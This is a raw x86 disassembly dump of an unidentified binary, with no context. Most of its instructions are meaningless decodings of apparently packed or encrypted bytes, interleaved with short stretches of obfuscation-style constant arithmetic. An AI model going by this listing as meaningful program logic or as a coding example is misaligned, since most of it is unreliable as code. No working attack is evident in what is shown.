  414798:	data16 jno 0x414796
  41479b:	dec    ebx
  41479c:	test   eax,0xd7b46f9b
  4147a1:	dec    ecx
  4147a2:	inc    ebx
  4147a3:	scas   eax,DWORD PTR es:[edi]
  4147a4:	enter  0xd3b4,0x4b
  4147a8:	cdq    
  4147a9:	or     al,0xd
  4147ab:	jecxz  0x4147ce
  4147ad:	or     bh,ah
  4147af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147b0:	jne    0x414791
  4147b2:	mov    esp,0xf51a2d50
  4147b7:	xchg   DWORD PTR [eax+0x7fb8990f],ebx
  4147bd:	jge    0x4147b4
  4147bf:	mov    BYTE PTR [ecx],0x10
  4147c2:	add    bl,dl
  4147c4:	out    0x1a,al
  4147c6:	outs   dx,DWORD PTR ds:[esi]
  4147c7:	mov    al,0xce
  4147c9:	mov    ebx,0x708ff748
  4147ce:	(bad)  
  4147cf:	pusha  
  4147d0:	sbb    dh,cl
  4147d2:	prefetcht2 BYTE PTR [edi+ebp*1]
  4147d6:	ja     0x4147cb
  4147d8:	jns    0x4147be
  4147da:	scas   eax,DWORD PTR es:[edi]
  4147db:	pusha  
  4147dc:	ret    0xc939
  4147df:	sbb    DWORD PTR [edi-0x178952a8],esp
  4147e5:	loope  0x4147d4
  4147e7:	outs   dx,DWORD PTR ds:[esi]
  4147e8:	push   edx
  4147e9:	xor    BYTE PTR [eax-0x2c0f5b9e],0x55
  4147f0:	cs jmp 0xce3b4897
  4147f6:	xchg   ebp,eax
  4147f7:	ficom  WORD PTR ds:0x98058351
  4147fd:	loop   0x414783
  4147ff:	pop    esp
  414800:	aam    0xf3
  414802:	xchg   edi,eax
  414803:	mov    BYTE PTR [ebx],ah
  414805:	aam    0xe3
  414807:	clc    
  414808:	(bad)  
  414809:	aas    
  41480a:	sbb    al,0x5f
  41480c:	mov    ds:0x926dda68,eax
  414811:	add    dh,0xc6
  414814:	(bad)  
  414815:	out    dx,eax
  414816:	sbb    ah,cl
  414818:	add    ebp,DWORD PTR [ecx+ecx*2]
  41481b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41481c:	(bad)  
  41481d:	or     esp,DWORD PTR [eax+0x27]
  414820:	xchg   ebp,edi
  414822:	aam    0x87
  414824:	dec    ebp
  414825:	add    edx,DWORD PTR [ebx]
  414827:	push   ds
  414828:	lea    edx,[esp+ecx*2+0x6a]
  41482c:	cmp    DWORD PTR [ebx+0x4ef6e26c],ecx
  414832:	fisub  WORD PTR [ecx-0x45]
  414835:	or     al,0x87
  414837:	jno    0x4148b4
  414839:	mov    DWORD PTR [edi],0x9d1ff49
  41483f:	and    bl,BYTE PTR [ecx+0x6b371154]
  414845:	pop    ds
  414846:	call   0xf17a:0x9a28fa70
  41484d:	test   al,0xb7
  41484f:	aad    0x2b
  414851:	push   edx
  414852:	test   DWORD PTR [ecx-0x6],esi
  414855:	sub    al,0x2b
  414857:	xchg   esi,eax
  414858:	stos   DWORD PTR es:[edi],eax
  414859:	or     eax,0x63375984
  41485e:	test   eax,0xc6b6d152
  414863:	data16 jbe 0x414864
  414866:	enter  0xdf,0x51
  41486a:	ja     0x414830
  41486c:	leave  
  41486d:	jmp    0x5ece:0x1224fce9
  414874:	inc    edx
  414875:	test   BYTE PTR [eax-0x7c2c56f6],0x92
  41487c:	mov    ds:0xa2ed7ef6,eax
  414881:	push   0x19299608
  414886:	jg     0x41480c
  414888:	xchg   esi,ebp
  41488a:	and    esp,DWORD PTR ds:0xc17d656e
  414890:	lods   eax,DWORD PTR ds:[esi]
  414891:	jne    0x414910
  414893:	mov    dl,0xd4
  414895:	pop    edx
  414896:	popa   
  414897:	and    BYTE PTR [edx+ebx*1-0x794c6b2b],dl
  41489e:	or     bl,BYTE PTR [eax]
  4148a0:	out    dx,eax
  4148a1:	call   0x2e96b2ab
  4148a6:	fiadd  DWORD PTR ds:0x70791594
  4148ac:	xor    eax,0xa9c73975
  4148b1:	mov    esp,0xfa7af275
  4148b6:	xor    ebx,esi
  4148b8:	sahf   
  4148b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ba:	test   eax,0x51df26f4
  4148bf:	jl     0x414921
  4148c1:	jmp    0x4148c9
  4148c3:	sbb    ah,0xa8
  4148c6:	loopne 0x41490b
  4148c8:	jecxz  0x41492f
  4148ca:	outs   dx,BYTE PTR ds:[esi]
  4148cb:	sbb    DWORD PTR [di+0x3630],esi
  4148d0:	loopne 0x41491b
  4148d2:	idiv   BYTE PTR [ebx+0x73]
  4148d5:	in     eax,dx
  4148d6:	lock iret 
  4148d8:	dec    edx
  4148d9:	and    ecx,ebx
  4148db:	int3   
  4148dc:	xchg   ecx,eax
  4148dd:	cmc    
  4148de:	pop    edi
  4148df:	or     bl,ah
  4148e1:	inc    DWORD PTR [eax-0x73377ea5]
  4148e7:	sbb    edi,esi
  4148e9:	push   DWORD PTR [eax]
  4148eb:	pop    esp
  4148ec:	add    edi,ebx
  4148ee:	pushf  
  4148ef:	push   ebp
  4148f0:	iret   
  4148f1:	mov    ds:0x103611ca,eax
  4148f6:	sub    ah,BYTE PTR [ebp+0x49eee998]
  4148fc:	sti    
  4148fd:	and    esi,ebx
  4148ff:	fmul   QWORD PTR [edx+0x7d]
  414902:	or     esi,ebp
  414904:	dec    esp
  414905:	mov    dl,0x29
  414907:	adc    eax,0xb891f258
  41490c:	clc    
  41490d:	cmp    ecx,DWORD PTR [esi-0x6f52103a]
  414913:	push   ebx
  414914:	sbb    eax,DWORD PTR [eax]
  414916:	fwait
  414917:	mov    edx,0xa8f47e4e
  41491c:	leave  
  41491d:	retf   0x3335
  414920:	andnps xmm5,XMMWORD PTR [edx+0x65]
  414924:	push   edx
  414925:	stos   BYTE PTR es:[edi],al
  414926:	lods   eax,DWORD PTR ds:[esi]
  414927:	iret   
  414928:	add    DWORD PTR [edi-0x9e32598],ecx
  41492e:	sbb    edx,DWORD PTR [edi]
  414930:	push   ebx
  414931:	jmp    0x4148bf
  414933:	lock adc ebp,DWORD PTR [edx]
  414936:	mov    eax,ds:0x5b13bcc2
  41493b:	ins    DWORD PTR es:[edi],dx
  41493c:	rcl    DWORD PTR [ebx+0x57],1
  41493f:	in     al,0x18
  414941:	inc    ecx
  414942:	xchg   esp,eax
  414943:	add    DWORD PTR [ebx-0x7446211b],edi
  414949:	dec    ebp
  41494a:	cld    
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x1b
  414996:	aad    0xa5
  414998:	mov    esp,0x18181c8b
  41499d:	rcl    BYTE PTR [edx],1
  41499f:	sbb    BYTE PTR [eax],bl
  4149a1:	jns    0x41498e
  4149a3:	cmp    al,0xe1
  4149a5:	call   0xc74c:0xdc6e5149
  4149ac:	imul   esp,DWORD PTR [eax],0xc1ecd6da
  4149b2:	lds    edi,FWORD PTR [esi-0x54]
  4149b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b6:	sub    eax,0x877ead15
  4149bb:	test   al,0x72
  4149bd:	call   0x47b7f1cf
  4149c2:	ss jge 0x41496a
  4149c5:	out    0x9d,eax
  4149c7:	stos   BYTE PTR es:[edi],al
  4149c8:	xor    al,0xec
  4149ca:	pmaddwd mm5,mm2
  4149cd:	lea    esp,[ecx]
  4149cf:	jle    0x414968
  4149d1:	rcl    DWORD PTR [edx],1
  4149d3:	or     BYTE PTR [edi+0x7eeb5596],al
  4149d9:	fcomip st,st(5)
  4149db:	mov    bl,0x81
  4149dd:	test   cl,cl
  4149df:	fwait
  4149e0:	jmp    0x414a0a
  4149e2:	nop
  4149e3:	es sbb cl,ch
  4149e6:	dec    edi
  4149e7:	stc    
  4149e8:	mov    edi,0x14a3c8a3
  4149ed:	mov    ds:0x77c32ab1,al
  4149f2:	iret   
  4149f3:	xchg   edx,eax
  4149f4:	pop    ebx
  4149f5:	xchg   DWORD PTR [eax],ebp
  4149f7:	jbe    0x414a77
  4149f9:	xor    BYTE PTR [ebx-0x78],al
  4149fc:	dec    eax
  4149fd:	cmp    cl,bh
  4149ff:	pop    edx
  414a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a01:	fisttp QWORD PTR [esi-0x48]
  414a04:	jmp    FWORD PTR [edx-0x54]
  414a07:	jmp    0x8d98:0x6fb9d996
  414a0e:	push   0xffffffab
  414a10:	dec    ebx
  414a11:	xchg   edx,eax
  414a12:	xor    ecx,ecx
  414a14:	loopne 0x4149c9
  414a16:	xor    eax,0x6b410217
  414a1b:	dec    edi
  414a1c:	(bad)  
  414a1d:	out    0xe4,al
  414a1f:	scas   eax,DWORD PTR es:[edi]
  414a20:	jge    0x414a44
  414a22:	loop   0x414a3c
  414a24:	js     0x414a2c
  414a26:	push   0xfffffff8
  414a28:	xor    BYTE PTR [ecx+0x3a636980],dl
  414a2e:	pop    ss
  414a2f:	jle    0x414a4c
  414a31:	adc    ebp,DWORD PTR [ecx]
  414a33:	sub    al,0xa6
  414a35:	call   0x369e:0x61fd5593
  414a3c:	xchg   esp,eax
  414a3d:	das    
  414a3e:	stc    
  414a3f:	arpl   WORD PTR ds:0x895baa78,dx
  414a45:	inc    esp
  414a46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a47:	ror    ch,cl
  414a49:	and    eax,DWORD PTR [edi]
  414a4b:	inc    eax
  414a4c:	in     al,0xdd
  414a4e:	lods   eax,DWORD PTR ds:[esi]
  414a4f:	or     DWORD PTR [esi],esp
  414a51:	mov    esi,0xf80a12c
  414a56:	or     ebx,DWORD PTR [ebp+0x70]
  414a59:	pop    ebx
  414a5a:	out    dx,eax
  414a5b:	pop    eax
  414a5c:	int3   
  414a5d:	outs   dx,BYTE PTR ds:[esi]
  414a5e:	popf   
  414a5f:	in     al,0xa6
  414a61:	lods   al,BYTE PTR ds:[esi]
  414a62:	pushf  
  414a63:	push   edi
  414a64:	xor    al,0xf2
  414a66:	fstp   st(6)
  414a68:	fadd   QWORD PTR ds:0xedd2ecc
  414a6e:	(bad)  [eax]
  414a70:	leave  
  414a71:	pop    edi
  414a72:	add    al,0xb9
  414a74:	and    BYTE PTR [ebx+0x5a7bcf4],dl
  414a7a:	icebp  
  414a7b:	cmp    cl,BYTE PTR [ebx+0x27aac39a]
  414a81:	lds    bp,DWORD PTR [edx+0x27]
  414a85:	or     BYTE PTR [edx],bh
  414a87:	sbb    DWORD PTR ds:0xac1d79d,esi
  414a8d:	daa    
  414a8e:	jmp    0x9fffed07
  414a93:	pop    edx
  414a94:	sub    DWORD PTR [ebp-0x704b2e10],edi
  414a9a:	sbb    esp,ecx
  414a9c:	js     0x414ad6
  414a9e:	int    0x8e
  414aa0:	ficomp WORD PTR [esi-0x6e]
  414aa3:	push   ebx
  414aa4:	mov    ebp,0xf4ed15bf
  414aa9:	sub    bl,BYTE PTR [ecx+0x2b2230ed]
  414aaf:	inc    edi
  414ab0:	ja     0x414ac5
  414ab2:	les    ebp,FWORD PTR [edx]
  414ab4:	test   BYTE PTR [ecx-0x7f9fca56],dl
  414aba:	inc    ebx
  414abb:	aaa    
  414abc:	mov    ah,0xa8
  414abe:	fld    DWORD PTR [ecx+ebx*1]
  414ac1:	jge    0x414b2b
  414ac3:	pop    ebp
  414ac4:	pop    es
  414ac5:	pop    es
  414ac6:	sbb    eax,0x3caa31f5
  414acb:	xor    cl,BYTE PTR [esi+eax*1+0x5d]
  414acf:	mov    dl,0xa7
  414ad1:	mov    al,0x1
  414ad3:	inc    edx
  414ad4:	xor    eax,0xa551b26b
  414ad9:	dec    ebx
  414ada:	push   es
  414adb:	inc    ebx
  414adc:	pop    edi
  414add:	test   DWORD PTR [ebx-0x51],ebp
  414ae0:	sub    al,0x6d
  414ae2:	xchg   edi,eax
  414ae3:	push   ds
  414ae4:	aam    0xe0
  414ae6:	scas   eax,DWORD PTR es:[edi]
  414ae7:	inc    edx
  414ae8:	pop    ss
  414ae9:	adc    eax,0x89ac24c6
  414aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aef:	pop    esi
  414af0:	cdq    
  414af1:	aad    0x87
  414af3:	xor    bh,ch
  414af5:	mov    ebp,0x816b1407
  414afa:	cmp    DWORD PTR [eax-0x23],0x627cfe7a
  414b01:	ss mov ch,0x3f
  414b04:	aas    
  414b05:	nop
  414b06:	push   es
  414b07:	mov    bl,0x21
  414b09:	pop    esp
  414b0a:	in     al,dx
  414b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b0c:	inc    edi
  414b0d:	add    eax,0x6576cdca
  414b12:	adc    al,0xf
  414b14:	das    
  414b15:	popf   
  414b16:	aad    0x99
  414b18:	pop    edx
  414b19:	int3   
  414b1a:	xchg   DWORD PTR [ebp+edx*1-0x4e5f6546],edx
  414b21:	xchg   ecx,eax
  414b22:	and    BYTE PTR [ebx-0x153e401],dl
  414b28:	or     al,0x46
  414b2a:	dec    eax
  414b2b:	pop    edi
  414b2c:	out    dx,eax
  414b2d:	cmc    
  414b2e:	pop    ebp
  414b2f:	jb     0x414b85
  414b31:	pushf  
  414b32:	xchg   bh,al
  414b34:	mov    bl,0x93
  414b36:	leave  
  414b37:	not    cl
  414b39:	(bad)  
  414b3b:	sbb    DWORD PTR [edi+0x62],esp
  414b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b3f:	inc    ecx
  414b40:	pop    esp
  414b41:	out    0xb8,al
  414b43:	call   0xa5f2:0x5f9601f0
  414b4a:	sahf   
  414b4b:	add    ah,BYTE PTR [eax-0x12]
  414b4e:	stc    
  414b4f:	cmp    eax,0xab0b863c
  414b54:	(bad)  
  414b55:	sahf   
  414b56:	mov    esp,0xb375bfef
  414b5b:	repz cwde 
  414b5d:	xchg   esp,eax
  414b5e:	les    esp,FWORD PTR [edi-0x38]
  414b61:	mov    ch,0x5e
  414b63:	add    ebx,DWORD PTR [ebp+0x30fea2e8]
  414b69:	push   esi
  414b6a:	aam    0x8c
  414b6c:	nop
  414b6d:	imul   eax,esp,0xffffffd6
  414b70:	jnp    0x414b9d
  414b72:	inc    edx
  414b73:	mov    bh,0x6b
  414b75:	xor    BYTE PTR ss:[edi-0x1711833d],cl
  414b7c:	test   eax,0x6fc2b1a9
  414b81:	lods   al,BYTE PTR ds:[esi]
  414b82:	push   esi
  414b83:	cdq    
  414b84:	mov    edx,0x491445f6
  414b89:	repz (bad) 
  414b8b:	mov    esi,0x991082a2
  414b90:	cmp    BYTE PTR [esi-0x2262c62d],ah
  414b96:	jle    0x414b38
  414b98:	pop    es
  414b99:	(bad)  
  414b9b:	adc    eax,DWORD PTR [ecx-0x45]
  414b9e:	fadd   st,st(2)
  414ba0:	ret    
  414ba1:	(bad)  
  414ba2:	cmp    ebx,DWORD PTR [edi]
  414ba4:	das    
  414ba5:	imul   ebx,DWORD PTR [ecx],0x5be97b02
  414bab:	sbb    eax,0x927f9dc
  414bb0:	cwde   
  414bb1:	jp     0x414bde
  414bb3:	sub    DWORD PTR [ebp+0x71579619],eax
  414bb9:	bnd jge 0x414c27
  414bbc:	scas   eax,DWORD PTR es:[edi]
  414bbd:	push   esp
  414bbe:	and    esp,DWORD PTR [eax+0x10]
  414bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bc2:	scas   eax,DWORD PTR es:[edi]
  414bc3:	in     eax,dx
  414bc4:	aad    0xbb
  414bc6:	add    DWORD PTR [edx],ebx
  414bc8:	pop    ecx
  414bc9:	fxch   st(7)
  414bcb:	lock into 
  414bcd:	pop    esi
  414bce:	mov    cl,0xd6
  414bd0:	sbb    eax,0x3c11318c
  414bd5:	imul   edx,DWORD PTR [ecx+0x60],0x18f94d58
  414bdc:	daa    
  414bdd:	test   al,0x10
  414bdf:	cs jmp 0xca36:0x9a4d7f90
  414be7:	adc    al,0xa4
  414be9:	cmp    al,0x5f
  414beb:	pop    edx
  414bec:	xor    DWORD PTR [edx+0xc],ebx
  414bef:	xchg   ebx,eax
  414bf0:	aad    0xf5
  414bf2:	pop    ds
  414bf3:	push   ds
  414bf4:	sbb    BYTE PTR [ebx+0x6],ah
  414bf7:	or     cl,BYTE PTR [edx]
  414bf9:	or     esi,eax
  414bfb:	std    
  414bfc:	pop    eax
  414bfd:	cld    
  414bfe:	lock out 0x7e,eax
  414c01:	adc    DWORD PTR ds:0x2e8d4f06,ebp
  414c07:	pop    ss
  414c08:	jae    0x414c52
  414c0a:	loopne 0x414c31
  414c0c:	daa    
  414c0d:	out    dx,al
  414c0e:	ds ret 
  414c10:	repz mul BYTE PTR [eax-0x43]
  414c14:	les    ebp,FWORD PTR [esi]
  414c16:	mov    ebp,0xed2f5ea3
  414c1b:	(bad)  
  414c1c:	les    esp,FWORD PTR [ebx]
  414c1e:	retf   0x6ad8
  414c21:	inc    esi
  414c22:	inc    eax
  414c23:	mov    al,ds:0x6c28222
  414c28:	or     al,ah
  414c2a:	mov    dl,0xa8
  414c2c:	jb     0x414c9e
  414c2e:	mov    eax,ds:0x36d6f556
  414c33:	lock jmp 0x414c8b
  414c36:	dec    ebp
  414c37:	das    
  414c38:	push   ebx
  414c39:	(bad)  
  414c3a:	jmp    0x414c23
  414c3c:	loop   0x414c43
  414c3e:	ret    0xd3d6
  414c41:	xchg   WORD PTR [eax+eiz*8],sp
  414c45:	ss mov dl,0x53
  414c48:	outs   dx,BYTE PTR ds:[esi]
  414c49:	push   eax
  414c4a:	jle    0x414c67
  414c4c:	out    dx,eax
  414c4d:	pop    edx
  414c4e:	inc    esp
  414c4f:	push   edi
  414c50:	sbb    dh,0x42
  414c53:	or     ecx,edi
  414c55:	xchg   esi,eax
  414c56:	jb     0x414be4
  414c58:	push   edx
  414c5a:	sahf   
  414c5b:	stos   BYTE PTR es:[edi],al
  414c5c:	xchg   ebp,eax
  414c5d:	int    0x2
  414c5f:	and    BYTE PTR [ecx+eiz*1-0x26750df7],al
  414c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c67:	push   cs
  414c68:	retf   0x192f
  414c6b:	ins    DWORD PTR es:[edi],dx
  414c6c:	adc    eax,0x8198372c
  414c71:	cld    
  414c72:	dec    ebp
  414c73:	push   ebx
  414c74:	cmp    DWORD PTR [esi-0x415a46ff],ecx
  414c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c7b:	mov    edx,0xd6beba40
  414c80:	cmp    ecx,DWORD PTR [edx-0x3f]
  414c83:	test   DWORD PTR [edi+ebp*2],esp
  414c86:	call   0xe3e4:0xdaef7b79
  414c8d:	(bad)  
  414c8e:	ficom  DWORD PTR [ebx]
  414c90:	inc    ebx
  414c91:	dec    esi
  414c92:	test   eax,0xcf3e2488
  414c97:	pop    ds
  414c98:	popf   
  414c99:	push   esp
  414c9a:	jle    0x414cd4
  414c9c:	lods   eax,DWORD PTR ds:[esi]
  414c9d:	xchg   esi,eax
  414c9e:	pop    es
  414c9f:	bound  ebx,QWORD PTR [esi]
  414ca1:	xchg   esi,eax
  414ca2:	sar    eax,0xca
  414ca5:	popf   
  414ca6:	popa   
  414ca7:	xchg   ecx,eax
  414ca8:	(bad)  
  414ca9:	scas   eax,DWORD PTR es:[edi]
  414caa:	ins    BYTE PTR es:[edi],dx
  414cab:	pop    ds
  414cac:	add    dl,BYTE PTR [eax+0x38cfcf98]
  414cb2:	out    0xef,al
  414cb4:	push   eax
  414cb5:	dec    ecx
  414cb6:	mov    al,0xec
  414cb8:	push   eax
  414cb9:	(bad)  
  414cba:	stos   DWORD PTR es:[edi],eax
  414cbb:	xor    DWORD PTR [edx+0x5984b11],esp
  414cc1:	mov    ds:0x7dcfd055,eax
  414cc6:	cld    
  414cc7:	(bad)  
  414cc8:	xchg   ebp,eax
  414cc9:	in     al,0xd
  414ccb:	popf   
  414ccc:	call   0xfc45762b
  414cd1:	xchg   esp,eax
  414cd2:	scas   eax,DWORD PTR es:[edi]
  414cd3:	je     0x414cdb
  414cd5:	not    BYTE PTR [ecx+0x3b]
  414cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd9:	js     0x414cd6
  414cdb:	add    al,0xc0
  414cdd:	sub    al,0x77
  414cdf:	stos   DWORD PTR es:[edi],eax
  414ce0:	in     al,dx
  414ce1:	mov    ebp,0x6fb75298
  414ce6:	jnp    0x414cb5
  414ce8:	add    DWORD PTR [esi+edi*2-0x6db51f5e],ebx
  414cef:	mov    WORD PTR [eax+0x23],es
  414cf2:	inc    esp
  414cf3:	rcl    BYTE PTR [eax-0xa],1
  414cf6:	stc    
  414cf7:	xor    eax,0xbcb16c7d
  414cfc:	and    ebx,DWORD PTR [ebx-0x73]
  414cff:	test   DWORD PTR [edi+eiz*2-0x3590d375],ebp
  414d06:	pushf  
  414d07:	mov    ah,0x6f
  414d09:	data16 rol bh,cl
  414d0c:	mov    dl,0xfb
  414d0e:	fist   WORD PTR [edx+0x11]
  414d11:	push   0xffffffba
  414d13:	fnsave [edx-0x55]
  414d16:	jnp    0x414cd8
  414d18:	ficom  DWORD PTR ds:0xc76d2a66
  414d1e:	ins    DWORD PTR es:[edi],dx
  414d1f:	std    
  414d20:	mov    ah,0x2e
  414d22:	sub    eax,0xf35d335e
  414d27:	fcomp  QWORD PTR [edx+0x19]
  414d2a:	call   0x66d2e35
  414d2f:	mov    WORD PTR [eax+0x59],cs
  414d32:	adc    eax,0xe46ccc10
  414d37:	mov    edi,0x7c30f523
  414d3c:	cmp    al,0x9e
  414d3e:	loopne 0x414d15
  414d40:	rcr    BYTE PTR [edx+edx*8],cl
  414d43:	(bad)  
  414d44:	lahf   
  414d45:	pop    ds
  414d46:	mov    edx,edx
  414d48:	sub    eax,0x4d8bc103
  414d4d:	or     BYTE PTR [ebx],al
  414d4f:	enter  0x4d89,0x8
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xd2
  414e02:	sbb    cl,BYTE PTR [ebp+0x7e]
  414e05:	inc    edx
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx-0x28e7e7ee],dl
  414e0e:	pop    ecx
  414e0f:	fdivrp st(7),st
  414e11:	repz adc al,0x2d
  414e14:	test   eax,0x49450bd4
  414e19:	aam    0x1b
  414e1b:	lea    ebp,[edx]
  414e1d:	into   
  414e1e:	nop
  414e1f:	ss or  al,0x61
  414e22:	jae    0x414de5
  414e24:	lock cmp DWORD PTR [ecx+esi*8-0x49],edx
  414e29:	pop    ebx
  414e2a:	leave  
  414e2b:	retf   0x3a94
  414e2e:	test   eax,0xd84b2ee7
  414e33:	mul    DWORD PTR [eax-0x26]
  414e36:	std    
  414e37:	cwde   
  414e38:	push   ss
  414e39:	lahf   
  414e3a:	in     eax,dx
  414e3b:	mov    DWORD PTR [edi],0xfe1cb47e
  414e41:	pop    eax
  414e42:	add    DWORD PTR [ecx+0x79d5a055],esi
  414e48:	cwde   
  414e49:	xor    ecx,ebp
  414e4b:	add    bh,0x3c
  414e4e:	fstp   DWORD PTR [eax+0x2c]
  414e51:	mov    dl,0x4
  414e53:	jns    0x414e3c
  414e55:	fbld   TBYTE PTR [ecx]
  414e57:	jb     0x414ddd
  414e59:	push   eax
  414e5a:	xor    DWORD PTR cs:[eax],esp
  414e5d:	xchg   esp,eax
  414e5e:	jmp    0x414e26
  414e60:	scas   al,BYTE PTR es:[edi]
  414e61:	fadd   DWORD PTR [ebx+0x25]
  414e64:	pop    esi
  414e65:	stos   BYTE PTR es:[di],al
  414e67:	clc    
  414e68:	cmp    eax,0x9c850184
  414e6d:	xchg   esp,eax
  414e6e:	jns    0x414e39
  414e70:	pop    esp
  414e71:	in     al,0xc0
  414e73:	(bad)  
  414e74:	aas    
  414e75:	dec    edx
  414e76:	fisttp WORD PTR [ecx]
  414e78:	cmp    BYTE PTR [ebx],al
  414e7a:	(bad)  
  414e7d:	loopne 0x414e81
  414e7f:	cdq    
  414e80:	and    eax,DWORD PTR [ecx+eax*2-0x12027f46]
  414e87:	mov    ds:0xad37c93b,al
  414e8c:	inc    esi
  414e8d:	jg     0x414eb0
  414e8f:	sbb    DWORD PTR [ebx],ecx
  414e91:	lods   al,BYTE PTR ds:[esi]
  414e92:	push   ds
  414e93:	sub    al,0x36
  414e95:	test   BYTE PTR ds:0x69cba0fa,dh
  414e9b:	push   eax
  414e9c:	sbb    DWORD PTR [edi+0x6c],0x1c7d6c71
  414ea3:	bound  eax,QWORD PTR ds:0x7af35271
  414ea9:	mov    ds:0xf95e5d4d,eax
  414eae:	js     0x414e62
  414eb0:	not    BYTE PTR [edi-0xb]
  414eb3:	add    al,BYTE PTR [esi+0x618704fb]
  414eb9:	adc    BYTE PTR [ebx+0x297ff34e],0xa8
  414ec0:	hlt    
  414ec1:	fbstp  TBYTE PTR [ebx-0x2c64146a]
  414ec7:	outs   dx,DWORD PTR ds:[esi]
  414ec8:	or     BYTE PTR [esi-0x4a],ah
  414ecb:	es dec eax
  414ecd:	mov    ds:0x188964ff,eax
  414ed2:	pop    DWORD PTR [ecx+0x5dc36672]
  414ed8:	ja     0x414eaa
  414eda:	pop    esp
  414edb:	adc    eax,DWORD PTR [eax+0x7e]
  414ede:	rcl    DWORD PTR [ecx+ebp*4],0x60
  414ee2:	inc    eax
  414ee3:	jg     0x414e98
  414ee5:	mov    WORD PTR [edi],cs
  414ee7:	retf   0xd732
  414eea:	test   al,bl
  414eec:	pusha  
  414eed:	cwde   
  414eee:	dec    eax
  414eef:	aaa    
  414ef0:	or     edx,ebx
  414ef2:	sub    eax,0xb108f3ef
  414ef7:	and    ch,al
  414ef9:	jns    0x414f28
  414efb:	loop   0x414f36
  414efd:	and    eax,0x79820220
  414f02:	xchg   ecx,eax
  414f03:	fs loopne 0x414ead
  414f06:	test   eax,0x491ba585
  414f0b:	imul   edx,DWORD PTR [ebx+esi*8],0x76e506c4
  414f12:	popf   
  414f13:	leave  
  414f14:	or     bh,ch
  414f16:	fs mov bh,0x89
  414f19:	jnp    0x414f11
  414f1b:	ficomp DWORD PTR [esi]
  414f1d:	inc    edi
  414f1e:	cmp    al,0x2d
  414f20:	sub    edx,eax
  414f22:	retf   0x5b0c
  414f25:	out    0x5f,eax
  414f27:	(bad)  
  414f28:	xchg   edi,eax
  414f29:	rcr    DWORD PTR [ebx],cl
  414f2b:	das    
  414f2c:	or     dl,0x92
  414f2f:	scas   eax,DWORD PTR es:[edi]
  414f30:	pop    eax
  414f31:	pop    edx
  414f32:	ja     0x414ee5
  414f34:	xchg   DWORD PTR [edx+edx*8+0xb4efe7e],ecx
  414f3b:	jl     0x414f59
  414f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f3e:	in     eax,0xad
  414f40:	shr    esp,0x57
  414f43:	pop    edi
  414f44:	and    DWORD PTR [edi+edx*4-0x178651df],esp
  414f4b:	sar    DWORD PTR gs:[edx+0x54],1
  414f4f:	jp     0x414f65
  414f51:	scas   al,BYTE PTR es:[edi]
